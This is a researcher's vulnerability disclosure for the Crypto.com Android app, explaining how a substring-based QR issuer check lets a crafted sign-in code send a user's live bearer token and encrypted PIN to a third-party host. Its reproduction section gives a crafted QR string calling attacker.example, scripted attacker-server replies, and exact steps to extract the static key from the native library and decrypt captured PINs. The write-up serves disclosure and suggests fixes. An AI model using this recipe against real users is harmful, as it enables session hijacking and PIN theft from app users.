# Crypto.com Android app: a crafted QR code hands over your access token and your PIN

The app checks sign-in QR codes with a substring test instead of a host comparison. Scan a crafted
code and the app sends your live access token to whatever server the code names — and if you
authorise the prompt that follows, your PIN too.

Tested on `co.mona.android` 3.245.02, Galaxy S24 Ultra (SM-S928B), against my own account only.

**This does not move money.** No transfer or withdrawal is reachable with what the attack yields,
and withdrawals require a one-time code when 2FA is on. What it hands over is a live session token
and a PIN.

## What happens

The app has a QR scanner under Settings, used for signing in on a desktop. A sign-in QR carries a
URL. Before the app trusts it, it fetches a list of allowed issuers from Crypto.com's own API —
which returns exactly one, a `uc.crypto.com` address.

The check is the problem. The app asks whether the allowed issuer string appears *anywhere* in the
QR text, rather than parsing the URL and comparing the host. So any URL that carries that string
somewhere harmless — a query parameter, for instance — passes while pointing somewhere else.

From there it unravels in three steps.

**1. The token leaves on the scan itself.** The app POSTs to the URL from the QR, attaching the
user's live bearer token. No screen in between, nothing to approve. The request also carries the
account UUID, region, device model and session identifiers.

**2. The confirmation screen is written by the attacker.** Whatever that server replies with fills
the "Are you trying to sign in on desktop?" prompt. The IP, the location and the device name shown
to help the user decide are all text from the server they were tricked into contacting. The reply
also names the next URL the app will call.

**3. The PIN follows, and it's decryptable.** Tap Authorize and enter the PIN, and the app verifies
it with Crypto.com, then sends it to the attacker's URL as well, still with the bearer attached.
The PIN is encrypted — with a key derived from a constant compiled into the shipped native
library, identical on every install.

## Why the QR step isn't much of a hurdle

Scanning a QR with this app is the flow Crypto.com already teaches people for desktop sign-in: open
the app, Settings, QR Code Scanner. A fake sign-in page showing a crafted code looks exactly like
the real one. The user is doing the thing they were told to do.

## What I proved, and what I didn't

Proven:

- One scan sends the access token to a host of the attacker's choosing, with no further tap.
- The token works from a different machine: an authenticated endpoint returns 401 without it, 200 with it.
- With Authorize plus PIN entry, the PIN arrives too and decrypts to the six digits.
- Reproduced four times across two days, same result.

Not proven:

- No profile or balance read. A separate filter rejected my attempts from a laptop and I didn't try to get past it.
- No money-moving request was attempted, and none is reachable from this.
- iOS wasn't tested.

## Root causes

| | |
|---|---|
| Substring test instead of a host match | The issuer check looks for the allowed string anywhere in the QR text. |
| The token interceptor ignores the host | Both requests go through a dynamic call path that attaches the bearer wherever it's going. |
| The second URL comes from the first reply | Once the attacker controls the first host, they name the second. |
| The PIN key is static per build | It lives in the shipped native library instead of being negotiated per session. |

## What would fix it

- Parse the QR URL and require an exact scheme and host match against the issuer list.
- Attach the bearer only to hosts on a fixed allowlist in the app, and apply the same rule to the URL that arrives in the scan reply.
- Stop sending the PIN to the sign-in service, or encrypt it to a server public key rather than to a key that ships inside the app.

## Reproducing it

Crypto.com has classed this behaviour as Informative twice — once on an earlier researcher's report
and again by closing mine as its duplicate — and didn't answer when I asked what mitigation I was
missing. There's no fix to embargo.

### The QR format

Five pipe-separated fields: `type|bearer|sig|url|hash`. The fourth is the URL the app will call.
The issuer substring only has to appear somewhere in the whole string, so carrying it as a query
parameter on your own host is enough. A hash of 64 zeros passes.

```
nft-login|1|0|https://attacker.example/v1/public/scan?i=https://uc.crypto.com/v1/public/scan|0000000000000000000000000000000000000000000000000000000000000000
```

### What the host replies

To the first POST. The `next_action` URL is where the PIN will go, and everything in
`current_action_response` is what the user sees on the prompt:

```json
{"ok":true,
 "current_action_response":{"origin_ip":"203.0.113.7","origin_ip_region":"Test",
                            "user_agent":"harness","session_id":"s1"},
 "next_action":{"name":"confirm","method":"POST",
                "url":"https://attacker.example/v1/public/confirm",
                "headers":["Authorization"],"payload":{"challenge":"c1"}}}
```

To the second: `{"ok":true,"status":"confirmed","session_id":"s1"}`.

### What arrives

On the scan, `POST /v1/public/scan` with a 66-character `Authorization: Bearer` and body
`{"hash": ...}`. Alongside it: `X-Crypto-User-Uuid`, `X-Crypto-User-Region`, `Tmx-Session-Id`,
`Device-Model`, `X-Request-Id` and more.

About seven seconds later, after Authorize and PIN entry, `POST /v1/public/confirm` arrives with
the same bearer and body `{"challenge":"c1","passcode":"<162 characters>"}`.

### The token is live

`GET https://app.mona.co/api/v1/qr/authorized-issuers` from a different machine returns 401 without
the captured token and 200 with it.

### Decrypting the PIN

Envelope: `base64( base64(ciphertext) "--" base64(IV) ) "--" <40 hex HMAC-SHA1>`.

The key comes from `Java_co_mona_android_core_config_Secrets_getEncryptKey` in
`lib/arm64-v8a/libsecrets.so`, in the app's arm64 split. It XORs 64 bytes at file offset `0x35f0`
with the SHA-256 hex of `co.mona.android.core.config`, giving 64 hex characters used hex-decoded as
a 32-byte AES key. Fingerprint, so you can check you derived the same one:
`sha256(key hex)[:12] = d2170cf3c248`.

AES-256-CBC with that key gives valid padding and a 39-byte plaintext:
`<6 digits>-<13-digit ms timestamp>-<random hex>`. The HMAC verifies with the same key. The six
digits are the PIN. I logged lengths and character classes only, never my own digits.

## Timeline

| Date | |
|---|---|
| 2026-11-20 | Found and reproduced, against my own account and my own phone. |
| 2026-11-21 | Reproduced again, PIN decryption confirmed, reported to Crypto.com through HackerOne. |
| 2026-11-22 | Closed as a duplicate of an earlier report — one itself classed Informative. Asked why, since the behaviour still worked as described, and asked whether they objected to my publishing. |
| 2026-11-24 | Still no reply. Published in full, since the behaviour has been declared a non-issue twice and there's nothing to hold for. |

No other person's data was accessed at any point. Reported through Crypto.com's HackerOne programme
before publication.
